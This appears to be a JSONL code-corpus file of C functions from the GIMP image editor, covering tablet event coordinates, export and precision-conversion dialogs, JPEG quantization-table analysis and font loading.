{"docstring": "/*  public functions  */\n", "func_signal": "gboolean\ngimp_device_info_get_event_coords (GimpDeviceInfo *info,\n                                   GdkWindow      *window,\n                                   const GdkEvent *event,\n                                   GimpCoords     *coords)", "code": "{\n  gdouble x;\n\n  if (event && gdk_event_get_axis (event, GDK_AXIS_X, &x))\n    {\n      *coords = default_coords;\n\n      coords->x = x;\n      gdk_event_get_axis (event, GDK_AXIS_Y, &coords->y);\n\n      /* translate event coordinates to window coordinates, only\n       * happens if we drag a guide from a ruler\n       */\n      if (event->any.window &&\n          event->any.window != window)\n        {\n          GtkWidget *src_widget;\n          GtkWidget *dest_widget;\n\n          src_widget = gtk_get_event_widget ((GdkEvent *) event);\n          gdk_window_get_user_data (window, (gpointer) &dest_widget);\n\n          if (src_widget && dest_widget)\n            {\n              gint offset_x;\n              gint offset_y;\n\n              if (gtk_widget_translate_coordinates (src_widget, dest_widget,\n                                                    0, 0,\n                                                    &offset_x, &offset_y))\n                {\n                  coords->x += offset_x;\n                  coords->y += offset_y;\n                }\n            }\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_PRESSURE, &coords->pressure))\n        {\n          coords->pressure = gimp_device_info_map_axis (info,\n                                                        GDK_AXIS_PRESSURE,\n                                                        coords->pressure);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_XTILT, &coords->xtilt))\n        {\n          coords->xtilt = gimp_device_info_map_axis (info,\n                                                     GDK_AXIS_XTILT,\n                                                     coords->xtilt);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_YTILT, &coords->ytilt))\n        {\n          coords->ytilt = gimp_device_info_map_axis (info,\n                                                     GDK_AXIS_YTILT,\n                                                     coords->ytilt);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_WHEEL, &coords->wheel))\n        {\n          coords->wheel = gimp_device_info_map_axis (info,\n                                                     GDK_AXIS_WHEEL,\n                                                     coords->wheel);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_DISTANCE, &coords->distance))\n        {\n          coords->distance = gimp_device_info_map_axis (info,\n                                                        GDK_AXIS_DISTANCE,\n                                                        coords->distance);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_ROTATION, &coords->rotation))\n        {\n          coords->rotation = gimp_device_info_map_axis (info,\n                                                        GDK_AXIS_ROTATION,\n                                                        coords->rotation);\n        }\n\n      if (gdk_event_get_axis (event, GDK_AXIS_SLIDER, &coords->slider))\n        {\n          coords->slider = gimp_device_info_map_axis (info,\n                                                      GDK_AXIS_SLIDER,\n                                                      coords->slider);\n        }\n\n      return TRUE;\n    }\n\n  gimp_device_info_get_device_coords (info, window, coords);\n\n  return FALSE;\n}", "path": "gimp/app/widgets/gimpdeviceinfo-coords.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/* Public Functions */\n", "func_signal": "GtkWidget *\ngimp_save_procedure_dialog_new (GimpSaveProcedure   *procedure,\n                                GimpProcedureConfig *config,\n                                GimpImage           *image)", "code": "{\n  GtkWidget   *dialog;\n  gchar       *title;\n  const gchar *format_name;\n  const gchar *help_id;\n  gboolean     use_header_bar;\n\n  g_return_val_if_fail (GIMP_IS_SAVE_PROCEDURE (procedure), NULL);\n  g_return_val_if_fail (GIMP_IS_PROCEDURE_CONFIG (config), NULL);\n  g_return_val_if_fail (gimp_procedure_config_get_procedure (config) ==\n                        GIMP_PROCEDURE (procedure), NULL);\n  g_return_val_if_fail (GIMP_IS_IMAGE (image), NULL);\n\n  format_name = gimp_file_procedure_get_format_name (GIMP_FILE_PROCEDURE (procedure));\n  if (! format_name)\n    {\n      g_critical (\"%s: no format name set on file procedure '%s'. \"\n                  \"Set one with gimp_file_procedure_set_format_name()\",\n                  G_STRFUNC,\n                  gimp_procedure_get_name (GIMP_PROCEDURE (procedure)));\n      return NULL;\n    }\n  /* TRANSLATORS: %s will be a format name, e.g. \"PNG\" or \"JPEG\". */\n  title = g_strdup_printf (_(\"Export Image as %s\"), format_name);\n\n  help_id = gimp_procedure_get_help_id (GIMP_PROCEDURE (procedure));\n\n  g_object_get (gtk_settings_get_default (),\n                \"gtk-dialogs-use-header\", &use_header_bar,\n                NULL);\n\n  dialog = g_object_new (GIMP_TYPE_SAVE_PROCEDURE_DIALOG,\n                         \"procedure\",      procedure,\n                         \"config\",         config,\n                         \"title\",          title,\n                         \"help-func\",      gimp_standard_help_func,\n                         \"help-id\",        help_id,\n                         \"use-header-bar\", use_header_bar,\n                         NULL);\n  GIMP_SAVE_PROCEDURE_DIALOG (dialog)->priv->image = image;\n  g_free (title);\n\n  return dialog;\n}", "path": "gimp/libgimp/gimpsaveproceduredialog.c", "commit_date": "2020-12-30 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Print one or two quantization tables, two columns.\n */\n", "func_signal": "static void\nprint_table_2cols (gint           table1_id,\n                   const guint16 *quant_table1,\n                   gint           table2_id,\n                   const guint16 *quant_table2)", "code": "{\n  gint i;\n  gint j;\n\n  if (quant_table2)\n    g_print (\"\\tQuantization table %d:              Quantization table %d:\\n\\t\",\n             table1_id, table2_id);\n  else\n    g_print (\"\\tQuantization table %d:\\n\\t\", table1_id);\n  for (i = 0; i < DCTSIZE; i++)\n    {\n      if (quant_table1)\n        {\n          for (j = 0; j < DCTSIZE; j++)\n            {\n              if (j != DCTSIZE - 1)\n                g_print (\"%3d \", quant_table1[i * DCTSIZE + j]);\n              else\n                {\n                  if (quant_table2)\n                    g_print (\"%3d  | \", quant_table1[i * DCTSIZE + j]);\n                  else if (i != DCTSIZE - 1)\n                    g_print (\"%3d\\n\\t\", quant_table1[i * DCTSIZE + j]);\n                  else\n                    g_print (\"%3d\\n\", quant_table1[i * DCTSIZE + j]);\n                }\n            }\n        }\n      else\n        {\n          g_print (\"                                 | \");\n        }\n      if (quant_table2)\n        {\n          for (j = 0; j < DCTSIZE; j++)\n            {\n              if (j != DCTSIZE - 1)\n                g_print (\"%3d \", quant_table2[i * DCTSIZE + j]);\n              else if (i != DCTSIZE - 1)\n                g_print (\"%3d\\n\\t\", quant_table2[i * DCTSIZE + j]);\n              else\n                g_print (\"%3d\\n\", quant_table2[i * DCTSIZE + j]);\n            }\n        }\n    }\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  public functions  */\n", "func_signal": "GtkWidget *\nconvert_precision_dialog_new (GimpImage                    *image,\n                              GimpContext                  *context,\n                              GtkWidget                    *parent,\n                              GimpComponentType             component_type,\n                              GeglDitherMethod              layer_dither_method,\n                              GeglDitherMethod              text_layer_dither_method,\n                              GeglDitherMethod              channel_dither_method,\n                              GimpConvertPrecisionCallback  callback,\n                              gpointer                      user_data)", "code": "{\n  ConvertDialog *private;\n  GtkWidget     *dialog;\n  GtkWidget     *main_vbox;\n  GtkWidget     *vbox;\n  GtkWidget     *frame;\n  GtkWidget     *perceptual_radio;\n  const gchar   *enum_desc;\n  gchar         *blurb;\n  const Babl    *old_format;\n  const Babl    *new_format;\n  gint           old_bits;\n  gint           new_bits;\n  gboolean       dither;\n  GimpTRCType    trc;\n\n  g_return_val_if_fail (GIMP_IS_IMAGE (image), NULL);\n  g_return_val_if_fail (GIMP_IS_CONTEXT (context), NULL);\n  g_return_val_if_fail (GTK_IS_WIDGET (parent), NULL);\n  g_return_val_if_fail (callback != NULL, NULL);\n\n  /* random formats with the right precision */\n  old_format = gimp_image_get_layer_format (image, FALSE);\n  new_format = gimp_babl_format (GIMP_RGB,\n                                 gimp_babl_precision (component_type, FALSE),\n                                 FALSE,\n                                 babl_format_get_space (old_format));\n\n  old_bits = (babl_format_get_bytes_per_pixel (old_format) * 8 /\n              babl_format_get_n_components (old_format));\n  new_bits = (babl_format_get_bytes_per_pixel (new_format) * 8 /\n              babl_format_get_n_components (new_format));\n\n  /*  don't dither if we are converting to a higher bit depth,\n   *  or to more than MAX_DITHER_BITS.\n   */\n  dither = (new_bits <  old_bits &&\n            new_bits <= CONVERT_PRECISION_DIALOG_MAX_DITHER_BITS);\n\n  trc = gimp_babl_format_get_trc (old_format);\n  trc = gimp_suggest_trc_for_component_type (component_type, trc);\n\n  private = g_slice_new0 (ConvertDialog);\n\n  private->image                    = image;\n  private->component_type           = component_type;\n  private->trc                      = trc;\n  private->layer_dither_method      = layer_dither_method;\n  private->text_layer_dither_method = text_layer_dither_method;\n  private->channel_dither_method    = channel_dither_method;\n  private->callback                 = callback;\n  private->user_data                = user_data;\n\n  gimp_enum_get_value (GIMP_TYPE_COMPONENT_TYPE, component_type,\n                       NULL, NULL, &enum_desc, NULL);\n\n  blurb = g_strdup_printf (_(\"Convert Image to %s\"), enum_desc);\n\n  dialog = gimp_viewable_dialog_new (g_list_prepend (NULL, image), context,\n                                     _(\"Encoding Conversion\"),\n                                     \"gimp-image-convert-precision\",\n                                     GIMP_ICON_CONVERT_PRECISION,\n                                     blurb,\n                                     parent,\n                                     gimp_standard_help_func,\n                                     GIMP_HELP_IMAGE_CONVERT_PRECISION,\n\n                                     _(\"_Cancel\"),  GTK_RESPONSE_CANCEL,\n                                     _(\"C_onvert\"), GTK_RESPONSE_OK,\n\n                                     NULL);\n\n  g_free (blurb);\n\n  gimp_dialog_set_alternative_button_order (GTK_DIALOG (dialog),\n                                           GTK_RESPONSE_OK,\n                                           GTK_RESPONSE_CANCEL,\n                                           -1);\n\n  gtk_window_set_resizable (GTK_WINDOW (dialog), FALSE);\n\n  g_object_weak_ref (G_OBJECT (dialog),\n                     (GWeakNotify) convert_precision_dialog_free, private);\n\n  g_signal_connect (dialog, \"response\",\n                    G_CALLBACK (convert_precision_dialog_response),\n                    private);\n\n  main_vbox = gtk_box_new (GTK_ORIENTATION_VERTICAL, 12);\n  gtk_container_set_border_width (GTK_CONTAINER (main_vbox), 12);\n  gtk_box_pack_start (GTK_BOX (gtk_dialog_get_content_area (GTK_DIALOG (dialog))),\n                      main_vbox, TRUE, TRUE, 0);\n  gtk_widget_show (main_vbox);\n\n\n  /*  gamma  */\n\n  frame = gimp_frame_new (_(\"Gamma\"));\n  gtk_box_pack_start (GTK_BOX (main_vbox), frame, FALSE, FALSE, 0);\n  gtk_widget_show (frame);\n\n  vbox = gimp_int_radio_group_new (FALSE, NULL,\n                                   G_CALLBACK (gimp_radio_button_update),\n                                   &private->trc, NULL,\n                                   trc,\n\n                                   _(\"Linear light\"),\n                                   GIMP_TRC_LINEAR, NULL,\n\n                                   _(\"Non-Linear\"),\n                                   GIMP_TRC_NON_LINEAR, NULL,\n\n                                   _(\"Perceptual (sRGB)\"),\n                                   GIMP_TRC_PERCEPTUAL, &perceptual_radio,\n\n                                   NULL);\n\n  if (private->trc != GIMP_TRC_PERCEPTUAL)\n    gtk_widget_hide (perceptual_radio);\n\n  gtk_container_add (GTK_CONTAINER (frame), vbox);\n  gtk_widget_show (vbox);\n\n\n  /*  dithering  */\n\n  if (dither)\n    {\n      GtkWidget    *hbox;\n      GtkWidget    *label;\n      GtkWidget    *combo;\n      GtkSizeGroup *size_group;\n\n      frame = gimp_frame_new (_(\"Dithering\"));\n      gtk_box_pack_start (GTK_BOX (main_vbox), frame, FALSE, FALSE, 0);\n      gtk_widget_show (frame);\n\n      vbox = gtk_box_new (GTK_ORIENTATION_VERTICAL, 6);\n      gtk_container_add (GTK_CONTAINER (frame), vbox);\n      gtk_widget_show (vbox);\n\n      size_group = gtk_size_group_new (GTK_SIZE_GROUP_HORIZONTAL);\n\n      /*  layers  */\n\n      hbox = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 6);\n      gtk_box_pack_start (GTK_BOX (vbox), hbox, FALSE, FALSE, 0);\n      gtk_widget_show (hbox);\n\n      label = gtk_label_new_with_mnemonic (_(\"_Layers:\"));\n      gtk_label_set_xalign (GTK_LABEL (label), 0.0);\n      gtk_box_pack_start (GTK_BOX (hbox), label, FALSE, FALSE, 0);\n      gtk_size_group_add_widget (size_group, label);\n      gtk_widget_show (label);\n\n      combo = gimp_enum_combo_box_new (GEGL_TYPE_DITHER_METHOD);\n      gtk_label_set_mnemonic_widget (GTK_LABEL (label), combo);\n      gtk_box_pack_start (GTK_BOX (hbox), combo, TRUE, TRUE, 0);\n      gtk_widget_show (combo);\n\n      gimp_int_combo_box_connect (GIMP_INT_COMBO_BOX (combo),\n                                  private->layer_dither_method,\n                                  G_CALLBACK (gimp_int_combo_box_get_active),\n                                  &private->layer_dither_method, NULL);\n\n      /*  text layers  */\n\n      hbox = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 6);\n      gtk_box_pack_start (GTK_BOX (vbox), hbox, FALSE, FALSE, 0);\n      gtk_widget_show (hbox);\n\n      label = gtk_label_new_with_mnemonic (_(\"_Text Layers:\"));\n      gtk_label_set_xalign (GTK_LABEL (label), 0.0);\n      gtk_box_pack_start (GTK_BOX (hbox), label, FALSE, FALSE, 0);\n      gtk_size_group_add_widget (size_group, label);\n      gtk_widget_show (label);\n\n      combo = gimp_enum_combo_box_new (GEGL_TYPE_DITHER_METHOD);\n      gtk_label_set_mnemonic_widget (GTK_LABEL (label), combo);\n      gtk_box_pack_start (GTK_BOX (hbox), combo, TRUE, TRUE, 0);\n      gtk_widget_show (combo);\n\n      gimp_int_combo_box_connect (GIMP_INT_COMBO_BOX (combo),\n                                  private->text_layer_dither_method,\n                                  G_CALLBACK (gimp_int_combo_box_get_active),\n                                  &private->text_layer_dither_method, NULL);\n\n      gimp_help_set_help_data (combo,\n                               _(\"Dithering text layers will make them \"\n                                 \"uneditable\"),\n                               NULL);\n\n      /*  channels  */\n\n      hbox = gtk_box_new (GTK_ORIENTATION_HORIZONTAL, 6);\n      gtk_box_pack_start (GTK_BOX (vbox), hbox, FALSE, FALSE, 0);\n      gtk_widget_show (hbox);\n\n      label = gtk_label_new_with_mnemonic (_(\"_Channels and Masks:\"));\n      gtk_label_set_xalign (GTK_LABEL (label), 0.0);\n      gtk_box_pack_start (GTK_BOX (hbox), label, FALSE, FALSE, 0);\n      gtk_size_group_add_widget (size_group, label);\n      gtk_widget_show (label);\n\n      combo = gimp_enum_combo_box_new (GEGL_TYPE_DITHER_METHOD);\n      gtk_label_set_mnemonic_widget (GTK_LABEL (label), combo);\n      gtk_box_pack_start (GTK_BOX (hbox), combo, TRUE, TRUE, 0);\n      gtk_widget_show (combo);\n\n      gimp_int_combo_box_connect (GIMP_INT_COMBO_BOX (combo),\n                                  private->channel_dither_method,\n                                  G_CALLBACK (gimp_int_combo_box_get_active),\n                                  &private->channel_dither_method, NULL);\n\n      g_object_unref (size_group);\n    }\n\n  return dialog;\n}", "path": "gimp/app/dialogs/convert-precision-dialog.c", "commit_date": "2020-05-17 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/* This is copied straight from make_alias_description in pango, plus\n * the gimp_font_list_add_font bits.\n */\n", "func_signal": "static void\ngimp_font_factory_make_alias (GimpContainer *container,\n                              PangoContext  *context,\n                              const gchar   *family,\n                              gboolean       bold,\n                              gboolean       italic)", "code": "{\n  PangoFontDescription *desc = pango_font_description_new ();\n\n  pango_font_description_set_family (desc, family);\n  pango_font_description_set_style (desc,\n                                    italic ?\n                                    PANGO_STYLE_ITALIC : PANGO_STYLE_NORMAL);\n  pango_font_description_set_variant (desc, PANGO_VARIANT_NORMAL);\n  pango_font_description_set_weight (desc,\n                                     bold ?\n                                     PANGO_WEIGHT_BOLD : PANGO_WEIGHT_NORMAL);\n  pango_font_description_set_stretch (desc, PANGO_STRETCH_NORMAL);\n\n  gimp_font_factory_add_font (container, context, desc);\n\n  pango_font_description_free (desc);\n}", "path": "gimp/app/text/gimpfontfactory.c", "commit_date": "2020-08-16 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/* ! USE_FONTCONFIG_DIRECTLY */\n", "func_signal": "static void\ngimp_font_factory_load_names (GimpContainer *container,\n                              PangoFontMap  *fontmap,\n                              PangoContext  *context)", "code": "{\n  PangoFontFamily **families;\n  PangoFontFace   **faces;\n  gint              n_families;\n  gint              n_faces;\n  gint              i, j;\n\n  pango_font_map_list_families (fontmap, &families, &n_families);\n\n  for (i = 0; i < n_families; i++)\n    {\n      pango_font_family_list_faces (families[i], &faces, &n_faces);\n\n      for (j = 0; j < n_faces; j++)\n        {\n          PangoFontDescription *desc;\n\n          desc = pango_font_face_describe (faces[j]);\n          gimp_font_factory_add_font (container, context, desc);\n          pango_font_description_free (desc);\n        }\n    }\n\n  g_free (families);\n}", "path": "gimp/app/text/gimpfontfactory.c", "commit_date": "2020-08-16 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  private functions  */\n", "func_signal": "static void\ngimp_font_factory_load_async (GimpAsync *async,\n                              FcConfig  *config)", "code": "{\n  if (FcConfigBuildFonts (config))\n    {\n      gimp_async_finish (async, config);\n    }\n  else\n    {\n      FcConfigDestroy (config);\n\n      gimp_async_abort (async);\n    }\n}", "path": "gimp/app/text/gimpfontfactory.c", "commit_date": "2020-08-16 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Analyze a JPEG file according to the command-line options.\n */\n", "func_signal": "static gboolean\nanalyze_file (gchar *filename)", "code": "{\n  struct jpeg_decompress_struct  cinfo;\n  struct my_error_mgr            jerr;\n  FILE                          *f;\n  gint                           i;\n  gint                           num_quant_tables;\n  GSList                        *source_list;\n\n  if ((f = fopen (filename, \"rb\")) == NULL)\n    {\n      g_printerr (\"Cannot open '%s'\\n\", filename);\n      return FALSE;\n    }\n\n  if (option_summary)\n    g_print (\"%s:\\n\", filename);\n\n  cinfo.err = jpeg_std_error (&jerr.pub);\n  jerr.pub.error_exit = my_error_exit;\n  if (setjmp (jerr.setjmp_buffer))\n    {\n      /* if we get here, the JPEG code has signaled an error. */\n      jpeg_destroy_decompress (&cinfo);\n      fclose (f);\n      return FALSE;\n    }\n  jpeg_create_decompress (&cinfo);\n\n  jpeg_stdio_src (&cinfo, f);\n\n  jpeg_read_header (&cinfo, TRUE);\n\n  num_quant_tables = 0;\n  for (i = 0; i < 4; i++)\n    if (cinfo.quant_tbl_ptrs[i])\n      num_quant_tables++;\n\n  source_list = detect_source (&cinfo, num_quant_tables);\n  if (! source_list)\n    {\n      add_unknown_table (&cinfo, filename);\n    }\n\n  if (! option_unknown)\n    {\n      if (option_summary)\n        print_summary (&cinfo, num_quant_tables);\n\n      if (option_ctable)\n        {\n          g_print (\"  {\\n    /* %s */\\n    \\\"?\\\", \\\"?\\\",\\n    %d, %d,\\n    %d,\\n\",\n                   filename,\n                   cinfo.comp_info[0].h_samp_factor,\n                   cinfo.comp_info[0].v_samp_factor,\n                   num_quant_tables);\n          for (i = 0; i < 4; i++)\n            if (cinfo.quant_tbl_ptrs[i])\n              print_ctable (i, cinfo.quant_tbl_ptrs[i]->quantval,\n                            (i < 3) && cinfo.quant_tbl_ptrs[i + 1]);\n          g_print (\"  },\\n\");\n        }\n\n      if (option_table_2cols)\n        {\n          print_table_2cols (0, cinfo.quant_tbl_ptrs[0]->quantval,\n                             1, cinfo.quant_tbl_ptrs[1]->quantval);\n          if (cinfo.quant_tbl_ptrs[2] || cinfo.quant_tbl_ptrs[3])\n            print_table_2cols (2, cinfo.quant_tbl_ptrs[2]->quantval,\n                               3, cinfo.quant_tbl_ptrs[3]->quantval);\n        }\n    }\n\n  if (source_list)\n    g_slist_free (source_list);\n\n  jpeg_destroy_decompress (&cinfo);\n  fclose (f);\n\n  return TRUE;\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  public functions  */\n", "func_signal": "void\ngimp_tool_item_set_visible (GimpToolItem *tool_item,\n                            gboolean      visible)", "code": "{\n  g_return_if_fail (GIMP_IS_TOOL_ITEM (tool_item));\n\n  if (visible != tool_item->priv->visible)\n    {\n      gboolean old_shown;\n\n      g_object_freeze_notify (G_OBJECT (tool_item));\n\n      old_shown = gimp_tool_item_get_shown (tool_item);\n\n      tool_item->priv->visible = visible;\n\n      g_signal_emit (tool_item, gimp_tool_item_signals[VISIBLE_CHANGED], 0);\n\n      if (gimp_tool_item_get_shown (tool_item) != old_shown)\n        gimp_tool_item_shown_changed (tool_item);\n\n      g_object_notify (G_OBJECT (tool_item), \"visible\");\n\n      g_object_thaw_notify (G_OBJECT (tool_item));\n    }\n}", "path": "gimp/app/core/gimptoolitem.c", "commit_date": "2020-04-01 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * ... FIXME: docs\n */\n", "func_signal": "static void\nprint_summary (struct jpeg_decompress_struct *cinfo,\n               gint                           num_quant_tables)", "code": "{\n  gint    quality;\n  gint    i;\n  GSList *source_list;\n\n  /* detect JPEG quality - test the formula used in the jpeg plug-in */\n  quality = jpeg_detect_quality (cinfo);\n  if (quality > 0)\n    g_print (\"\\tQuality:  %02d (exact)\\n\", quality);\n  else if (quality < 0)\n    g_print (\"\\tQuality:  %02d (approx)\\n\", -quality);\n  else\n    g_print (\"\\tQuality:  unknown\\n\");\n\n  /* JPEG sampling factors */\n  g_print (\"\\tSampling: %dx%d\",\n           cinfo->comp_info[0].h_samp_factor,\n           cinfo->comp_info[0].v_samp_factor);\n  if ((cinfo->num_components > 1 && cinfo->num_components != 3)\n      || cinfo->comp_info[1].h_samp_factor != 1\n      || cinfo->comp_info[1].v_samp_factor != 1\n      || cinfo->comp_info[2].h_samp_factor != 1\n      || cinfo->comp_info[2].v_samp_factor != 1)\n    {\n      for (i = 1; i < cinfo->num_components; i++)\n        g_print (\",%dx%d\",\n                 cinfo->comp_info[i].h_samp_factor,\n                 cinfo->comp_info[i].v_samp_factor);\n    }\n  g_print (\"\\n\");\n\n  /* Number of quantization tables */\n  g_print (\"\\tQ.tables: %d\\n\", num_quant_tables);\n\n  source_list = detect_source (cinfo, num_quant_tables);\n  if (source_list)\n    {\n      GSList  *l;\n      guint32  hash;\n      guint32  hash_t;\n\n      hash = hash_quant_tables (cinfo);\n      hash_t = hash_transposed_quant_tables (cinfo);\n\n      for (l = source_list; l; l = l->next)\n        {\n          QuantInfo   *source_info = l->data;\n          const gchar *comment = \"\";\n\n          if (source_info->hash == hash)\n            comment = \"\";\n          else if (source_info->hash == hash_t)\n            comment = \" (rotated)\";\n          else if (num_quant_tables == 1)\n            comment = \" (grayscale)\";\n          else\n            comment = \" (FALSE MATCH)\";\n\n          g_print (\"\\tSource:   %s - %s%s\\n\",\n                   source_info->source_name,\n                   source_info->setting_name,\n                   comment);\n        }\n      g_slist_free (source_list);\n    }\n  else\n    g_print (\"\\tSource:   unknown\\n\");\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
